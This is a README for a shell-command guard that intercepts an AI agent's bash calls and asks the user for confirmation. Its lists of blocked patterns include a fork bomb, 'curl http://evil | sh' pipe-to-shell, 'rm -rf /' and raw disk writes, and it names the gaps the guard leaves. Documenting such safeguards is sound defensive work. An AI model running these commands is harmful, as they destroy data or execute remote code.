# bash-guard (pi extension)

Intercepts agent-issued `bash` tool calls and prompts for confirmation before running
destructive or questionable commands. Runs in the main (interactive) session only.

## What it does

When a `bash` tool call is made, bash-guard analyzes the command and, if it looks risky,
interrupts execution with a confirmation dialog instead of running it immediately. This gives
the user a chance to stop mistakes like `rm -rf /`, `git reset --hard`, or `curl http://evil | sh`.

## How it works

1. **Parsing.** The command is parsed with [`shell-quote`](https://github.com/quenster/shell-quote)
   into structured tokens (shell words + operators like `|`, `>`, `&&`).
2. **Whole-command checks.** Operators that apply to the entire command are checked first:
   output/input redirection (`>`, `>>`, `2>`, `<`) and pipes (`|`).
3. **Segment analysis.** The command is split on `&&`, `||`, and `;` and each segment is run
   through a set of heuristics that map commands/flags to risk reasons and a severity
   (`medium` or `high`).
4. **Dedup.** Duplicate reasons are collapsed before a verdict is returned.
5. **Decision.**
   - If nothing risky is found, the command runs normally.
   - If something is flagged, a confirmation dialog is shown (see below).
   - When disabled, interactive prompting is skipped and only a hard-block floor applies.

### Confirmation dialog

A 3-option dialog is presented:

- **Run** — execute the command.
- **Abort** — block with the default reason.
- **Abort with reason** — block and type a custom reason, which is passed to the model to help
  it propose a safer alternative.

To avoid annoying retry loops, a command that was aborted is remembered for **60 seconds**; if
the same command is issued again in that window it is auto-blocked.

## What it blocks

### Interactive mode (prompts)

- **Any `git ...` command.** Severity is escalated for especially risky ones: `git rm`,
  `git reset --hard`, `git clean -fdx`, `git push --force`, `git reflog expire`,
  `git gc --prune`, and `git checkout`/`git restore` over the working tree.
- **Disk / volume tooling:** `diskutil`, `hdiutil`, `mkfs*`, `newfs_*`, `wipefs`, `parted`,
  `fdisk`, `gdisk/sgdisk`, `cryptsetup`, `pvcreate/vgcreate/lvcreate`, `zpool`, `lsblk`, `asr`, `gpt`.
- **Other dangerous commands:** `rm`/`rmdir`/`unlink`, `sudo`, `find -delete`, `dd of=…`,
  `truncate`, `sed -i`, fork bombs (`:(){:|:&};:`), `perl -pi`, `chmod/chown -R`,
  `mv/cp --force`, `kill`/`pkill`/`killall`, `shutdown`/`reboot`, `systemctl stop/disable`,
  `curl|sh`/`wget|sh`, `kubectl delete`, `terraform destroy`, `aws s3 rm --recursive`,
  `gcloud delete`, shell redirections (`>`, `>>`, `2>`), and pipes.

### Disabled (autonomous) mode — hard-block floor

Run `/bash-guard` to disable interactive prompting for the session. Routine git operations
(`git commit`, `git pull`, `git push`) then pass through, but the following catastrophic /
non-recoverable operations are still hard-blocked with no user interaction:

| Pattern | Reason |
|---|---|
| `:(){:|:&};:` (fork bomb) | Recursive process exhaustion |
| `rm -r` / `-rf` / `-Rf` (non-git) | Recursive deletion |
| `sudo` | Elevated privileges |
| `curl\|sh`, `wget\|sh` | Pipe to shell (remote code execution) |
| `mkfs*`, `newfs_*`, `wipefs` | Filesystem / disk-signature wipe |
| `diskutil erase/zeroDisk/secureErase/reformat` | Destructive disk operation |
| `dd of=/dev/…` | Raw disk write |
| `parted`, `fdisk`, `gdisk`, `sgdisk` | Partition table management |
| `cryptsetup`, `zpool` | Disk encryption / ZFS |
| `shutdown`, `reboot`, `halt`, `poweroff` | System power operation |
| `terraform destroy` | Infrastructure teardown |
| `kubectl delete` | Kubernetes resource deletion |
| `aws s3 rm --recursive` | Bulk S3 deletion |
| `git reset --hard` | Discard all uncommitted changes |
| `git clean -f` | Delete untracked files |
| `git reflog expire`, `git gc --prune` | Remove recovery history |

All other commands (including routine git operations) pass through unaffected.

## Configuration

- **`bash-guard-disabled`** (boolean flag, default `false`): start the session with
  bash-guard disabled (autonomous mode; the hard-block floor still applies).
- **`bash-guard-auto-allow`** (boolean flag, default `false`): allow flagged commands when there
  is no UI available (e.g. running pi non-interactively).
- **`/bash-guard`** (command): toggle between interactive and disabled (autonomous) mode for the
  current session. When disabled, a `⚠ BG OFF` status badge is shown. The toggle is session-local
  and is not persisted across reloads or restarts.

## Install

Auto-discovered from `~/.pi/agent/extensions/bash-guard/`. Run `/reload` in pi.

## Notes

- Runs in the main (interactive) session only. Subagent / headless hard-block mode has been
  removed; spawned subagents are no longer intercepted.
- Scope: `bash` tool calls only. `write`/`edit` and user `!` commands are not intercepted.
- Detection is heuristic and not exhaustive: commands that don't match a known pattern are allowed.
